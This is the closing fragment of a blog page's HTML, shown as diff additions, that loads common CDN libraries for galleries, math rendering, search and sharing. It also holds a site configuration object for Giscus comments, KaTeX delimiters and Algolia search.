+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.1/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/copy-tex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":50},"comment":{"giscus":{"category":"Announcements","categoryId":"DIC_kwDOLrwAO84CekJn","darkTheme":"dark","emitMetadata":"0","inputPosition":"bottom","lang":"zh-CN","lazyLoading":false,"lightTheme":"light","mapping":"pathname","reactionsEnabled":"1","repo":"GaloisHLee/Giscus","repoId":"R_kgDOLrwAOw"}},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":true,"left":"$$","right":"$$"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"},{"display":false,"left":"$","right":"$"}],"strict":false},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.zh-cn","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.485ce22971162ae594e2f22468d97519fb9c08a7112e3a012e8684cfe098b474.js" integrity="sha256-SFziKXEWKuWU4vIkaNl1GfucCKcRLjoBLoaEz+CYtHQ="></script></body>
+</html>
